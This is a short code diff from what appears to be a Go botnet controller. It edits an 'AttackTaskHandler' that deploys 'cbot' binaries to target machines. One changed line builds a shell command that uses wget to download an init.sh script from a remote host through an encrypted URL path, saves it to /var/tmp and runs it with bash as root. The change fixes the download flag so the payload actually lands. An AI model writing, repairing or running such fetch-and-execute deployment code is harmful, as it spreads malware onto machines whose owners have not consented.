@@ -77,7 +77,7 @@ func (ath *AttackTaskHandler) getCbotNames(osType model.OsType) (cbotFpath strin
 		return "", "", ""
 	}
 
-	return filepath.Join(ath.cbotStoreDir, cbot), filepath.Join(ath.cbotStoreDir, init), filepath.Join(ath.cbotStoreDir, start)
+	return cbot,init,start
 
 }
 
@@ -226,7 +226,7 @@ func (ath *AttackTaskHandler) deployCbots(taskId string, request *model.CreateAt
 
 	url := fmt.Sprintf("http://%s:%d/%s", ath.rhost, ath.fport, netutils.URLPathCryptToString(upc))
 
-	cmd := fmt.Sprintf("wget %s -o /var/tmp/init.sh;bash /var/tmp/init.sh %s", url, "root")
+	cmd := fmt.Sprintf("wget %s -O /var/tmp/init.sh;bash /var/tmp/init.sh %s", url, "root")
 
 	if request.Passwd != "" {
 
